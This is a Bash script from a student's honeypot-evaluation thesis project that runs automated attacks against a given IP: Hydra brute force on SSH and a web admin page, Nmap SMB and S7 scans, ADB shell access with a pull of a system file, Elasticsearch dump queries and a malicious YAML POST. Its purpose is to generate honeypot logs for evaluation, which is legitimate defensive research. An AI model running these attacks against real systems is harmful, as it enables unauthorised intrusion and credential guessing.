#!/bin/bash

# SCRIPT DE ATAQUES AUTOMÁTICOS PARA TFG – Pablo

# Colores
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Obtener ancho de terminal
cols=$(tput cols)

# Función para centrar texto
center() {
    while IFS= read -r line; do
        padding=$(( (cols - ${#line}) / 2 ))
        printf "%*s%s\n" "$padding" "" "$line"
    done
}

clear

# Mostrar dibujo en rojo y centrado
echo -e "${RED}"
cat << "EOF" | center
⠀⠀⠀⠀⠀⠀⢀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⠟⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡻⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡇⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠘⣧⠀⡀⠀⠀
⠀⠀⠀⣰⡏⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢸⣧⠀⠀⠀
⠀⠀⢰⠃⢸⠄⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⢾⠈⣧⠀⠀
⠀⠀⢸⡄⢸⣄⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⢀⡏⢀⣟⠀⠀
⠀⢠⠿⡇⠈⣿⡀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⣽⠇⢀⡟⡆⠀
⠀⢸⠀⢻⠂⠸⣷⡀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⢀⣼⡟⠀⡺⠀⣹⠀
⠀⣼⡃⢸⣷⠄⢹⣿⣆⠸⣏⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢡⡇⢀⣿⣯⠀⣴⡗⠀⣿⡀
⢸⡇⢷⣄⠹⣷⣬⣿⣿⡛⠻⣆⠀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠚⠁⢀⡿⠛⣻⡿⢡⣼⠟⢀⡼⠁⡇
⠀⢳⡀⣷⣄⡸⣿⣮⣿⣷⡀⠙⣶⣄⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⣀⣴⠏⠀⣾⣿⣥⣿⠏⣀⣼⠁⡼⠃
⠀⠈⣯⠈⢿⣦⡘⣿⡄⠙⢦⣀⢽⣿⣿⠶⠄⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⠠⠶⣾⣿⡿⢁⡴⠛⢁⣼⠁⣴⡿⠋⣸⠇⠀
⠀⠀⢸⠻⣆⠙⣿⣿⣿⣆⠀⢻⣷⣾⣿⣅⠀⠀⠀⣱⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢀⣽⣷⣾⡟⠀⢀⣾⣿⣿⠋⣐⡾⣻⠀⠀
⠀⠀⠈⢧⡈⢿⣬⣽⣿⣉⠙⢲⣮⣽⡇⠀⠀⢀⡞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡆⠀⠀⢰⣿⣵⡶⠚⢉⣹⣟⣡⣼⠏⣠⠃⠀⠀
⠀⠀⠀⠘⢷⣄⡉⠻⣿⣿⣥⣤⣿⣿⣿⡋⠀⠈⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠃⠀⢘⣿⣿⣿⣤⣤⣿⣿⠟⠋⣀⡴⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠙⠒⢬⡿⠋⠀⠀⣘⣿⣷⡟⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⢘⣾⣿⣇⡀⠀⠈⢻⡯⠔⠚⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠷⢤⡞⠉⠀⣩⣿⣿⣾⠀⠀⠈⢣⠀⠀⠀⠀⣰⠃⠀⡀⢻⣿⣿⣯⡀⠉⠓⡦⠽⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣠⠞⠁⣰⠻⣿⣿⡧⠤⢌⣱⠄⠀⢾⡁⠤⢤⡿⣿⠟⢧⠀⠙⣦⣾⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣦⣧⣤⣏⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⣜⣧⣬⣧⣶⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
EOF
echo -e "${NC}"

# Mostrar título en verde y centrado
echo -e "${GREEN}"
center << EOF
𝐻.𝐴.𝐷.𝐸.𝑆. - 𝐻𝑜𝑛𝑒𝑦𝑝𝑜𝑡 𝐴𝑡𝑡𝑎𝑐𝑘 & 𝐷𝑒𝑡𝑒𝑐𝑡𝑖𝑜𝑛 𝐸𝑣𝑎𝑙𝑢𝑎𝑡𝑖𝑜𝑛 𝑆𝑢𝑖𝑡𝑒
     𝑏𝑦 𝑃𝐴𝐵𝐿𝑂 𝐴𝐵𝐸𝐿𝐴𝐼𝑅𝐴
EOF
echo -e "${NC}"

# Esperar 5 segundos
sleep 5

# ---------------------------------------------------------
# Script de ataques automáticos
# ---------------------------------------------------------

TARGET="$1"

if [ -z "$TARGET" ]; then
  echo -e "${RED}Uso: $0 <IP-objetivo>${NC}"
  exit 1
fi

echo -e "${BLUE}[+] Objetivo:${NC} $TARGET"

explain() {
  echo -e "\n${YELLOW}=============================="
  echo -e "▶  $1"
  echo -e "==============================${NC}"
}

explain "🔴 Tanner - Detección de escaneos SMB usando scripts de Nmap."
nmap -p 445 --script smb-protocols.nse "$TARGET"

explain "🟢 Cowrie - Fuerza bruta SSH para simular intento de acceso con Hydra."
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 "$TARGET" ssh

explain "🟢 Cowrie - Conexión SSH manual falsa para generar logs de intrusión."
timeout 10s ssh -q -o StrictHostKeyChecking=no -o ConnectTimeout=3 admin@"$TARGET" || echo -e "${RED}SSH finalizado (fallo o timeout esperado).${NC}"

explain "🟢 Conpot - Escaneo SCADA simulando acceso a protocolo S7 industrial."
nmap -sU -p 102 "$TARGET"

explain "🟢 Dionaea - Escaneo de puertos típicos para capturar malware y exploits."
nmap -p 445,21,80 "$TARGET"

explain "🟢 Dionaea - Intento de conexión FTP simulando login básico."
if command -v ftp &>/dev/null; then
  echo -e "user anonymous\r\npass test\r\nquit\r\n" | ftp -n "$TARGET"
else
  echo -e "${YELLOW}[!] ftp no está instalado.${NC}"
fi

explain "🟢 CISCOASA - Ataque por fuerza bruta HTTP a portal web simulado."
hydra -l admin -P /usr/share/wordlists/rockyou.txt "$TARGET" http-get /admin

explain "🟢 Adbhoney - Simulación de conexión a Android Debug Bridge (ADB)."
if command -v adb &>/dev/null; then
  adb connect "$TARGET:5555"
  adb shell
  adb pull /data/system/packages.xml
else
  echo -e "${YELLOW}[!] adb no está instalado.${NC}"
fi

explain "🟢 H0neytr4p - Escaneo de puerto DNS para simular tráfico sospechoso UDP."
nmap -sU -p 53 "$TARGET"

explain "🟢 ElasticPot - Consultas maliciosas contra un servidor Elasticsearch."
curl http://"$TARGET":9200
curl -X GET "$TARGET:9200/_search?q=*"

explain "🟢 Honeyaml - Envío de carga YAML maliciosa contra endpoint vulnerable."
if [ -f "/home/kali/Desktop/payload.yml" ]; then
  curl -X POST http://"$TARGET"/yaml -H "Content-Type: application/x-yaml" -d "@/home/kali/Desktop/payload.yml"
else
  echo -e "${YELLOW}[!] payload.yml no encontrado.${NC}"
fi

echo -e "\n${GREEN}[✓] Todos los ataques se han ejecutado.${NC}"
